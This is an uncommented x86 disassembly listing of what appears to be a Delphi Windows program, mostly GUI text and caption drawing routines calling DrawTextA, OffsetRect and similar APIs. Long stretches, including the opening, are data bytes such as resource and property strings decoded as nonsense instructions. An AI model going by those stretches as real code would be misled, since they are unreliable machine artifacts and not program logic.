outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ah 0x5a
jpe r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ edi + eax * 8 - 0x16bfffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
int3
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
arpl [ ebx - 0x64 ] bp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
je r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
add [ eax ] al
mov [ ebx ] es
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
adc al 0x2
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
or eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
or al 0x44
add [ esi ] al
jge r-xdata
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or eax 0x2140044
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
cmp [ ecx + 0x44 ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
add [ edi * 4 - 0xf53ffbc ] bl
jb r-xdata
add al bl
add [ eax ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
jpo r-xdata
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
xor al [ eax ]
pop esp
xor al [ eax ]
or bh ch
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
or al 0x45
jb r-xdata
push ss
inc edx
add [ esi + edx * 2 ] bl
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
mov al 0x13
inc edx
add ah ch
inc esp
add [ eax ] al
js r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
lodsb [ esi ]
sbb al 0xc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc esp
outsd
jpo r-xdata
push eax
outsd
jo r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
outsd
outsb
je r-xdata
jpe r-xdata
jbe r-xdata
add al ch
add [ eax ] al
sub_440df3
xchg esp eax
push ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
push 0x656b6365
and [ fs : esi ] 0x42
add [ eax ] dh
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
sub_441095
push edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
pop edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ah 0x5a
jpe r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ edi + eax * 8 - 0x16bfffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
int3
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
je r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
add [ gs : eax ] eax
jge r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ ebx + edx ] bl
inc esp
add [ eax ] cl
jae r-xdata
insb
insb
inc ebx
outsd
add [ gs : eax ] eax
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or [ ebx + 0x63 ] dh
push eax
popad
jae r-xdata
push ebp
jo r-xdata
arpl [ ecx + ebp * 2 + 0x6e ] cx
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
cmp [ ecx + 0x44 ] 0x0
or [ esp + edx * 2 ] cl
dec esp
imul ebp [ esi + 0x65 ] 0x730a7055
arpl [ ecx + ebp * 2 + 0x6e ] cx
inc esp
outsd
ja r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
inc esp
jae r-xdata
jae r-xdata
jb r-xdata
add al bl
add [ eax ] eax
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9431128
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
jpo r-xdata
or dh [ ebx + 0x63 ]
jae r-xdata
inc ebp
jbe r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x6e776f44
add [ eax ] al
add [ edx + 0x15320044 ] cl
inc esp
add [ eax ] bh
add al [ eax ]
add [ eax - 0x79 ] dh
outsb
je r-xdata
push 0x65
inc esp
outsd
ja r-xdata
jb r-xdata
push ebp
jo r-xdata
arpl [ eax + 0x61 ] dx
jb r-xdata
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc eax
add [ eax + 0x8004413 ] ah
or al 0x54
arpl [ edx + 0x6f ] si
insb
insb
push eax
push esp
outsd
jo r-xdata
arpl [ edx + 0x6f ] si
insb
insb
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
insb
je r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebx
outsd
or edx [ gs : ebx + edx * 2 + 0x63 ]
arpl [ gs : eax + eax + 0xa ] si
push eax
popad
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
jb r-xdata
or [ ebx + 0x63 ] dh
nop
and [ ebx ] dl
inc esp
add [ ebx ] al
or edx [ ebx + edx * 2 + 0x63 ]
jb r-xdata
push eax
outsd
jae r-xdata
inc esp
outsd
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
or esi [ ebx + 0x63 ]
inc ebp
outsb
push ebx
jae r-xdata
adc eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x15
inc esp
add [ edx ] dh
adc eax 0x2380044
add [ eax ] al
jo r-xdata
insb
inc ebx
outsd
add [ gs : ecx ] ecx
push ebx
outsd
outsb
pop es
jae r-xdata
add [ edx ] cl
arpl [ eax + eax + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
add [ esp + edx + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insd
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + ebx * 2 + 0x44 ] cl
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0xf53ffbc ] bl
jb r-xdata
outsd
jae r-xdata
inc edx
outsd
je r-xdata
insb
push esp
jb r-xdata
inc eax
add [ ebx + edx ] bl
inc esp
add [ eax + edx ] bh
add al 0x11
arpl [ ebx + 0x5 ] bp
sub_441bd0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454d80
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44c008
mov edx 0x69
mov eax esi
call sub_44c02c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_441c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f124
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_42546c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4253c8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_441c98
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44203a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_42546c
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_4253c8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_44c874
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_417298
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x54 ]
call sub_4042f8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x58 ]
call sub_4044f8
push eax
mov eax edi
call sub_425570
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_417298
mov eax ebx
mov si 0xffc8
call sub_4034a4
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_424c70
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4250e0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_424c70
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_425570
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442041
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x60 ]
call sub_404744
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_40405c
retn
mov eax ebx
mov si 0xffc8
call sub_4034a4
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4250e0
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_44c874
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_4253ac
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_417298
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_417298
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404890
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43d728
jmp r-xdata
call sub_43d448
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43d78c
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43d634
push 0x0
mov eax edi
call sub_425570
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_44c874
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44eba4
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x80 ]
call sub_4042f8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x84 ]
call sub_4044f8
push eax
mov eax edi
call sub_425570
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_424c70
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x88 ]
call sub_4042f8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x8c ]
call sub_4044f8
push eax
mov eax edi
call sub_425570
push eax
call DrawTextA
sub_44204b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4420c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464224
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45253c
mov eax ebx
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov eax ebx
call sub_453618
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4420cd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_442118
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454300
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_44c008
mov edx 0x11
mov eax esi
call sub_44c02c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43d448
call sub_43d528
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_4421c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44231a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44eba4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_42546c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404300
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4244a4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4244a4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442321
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_44232b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_442554
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424d8c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424c70
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424d8c
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4250a4
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_4034a4
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_4034a4
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_44244c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_4255f0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_4034a4
xor edx edx
mov eax [ edi + 0x160 ]
call sub_4255f0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4495d4
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_442590
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_442554
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4425f0
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
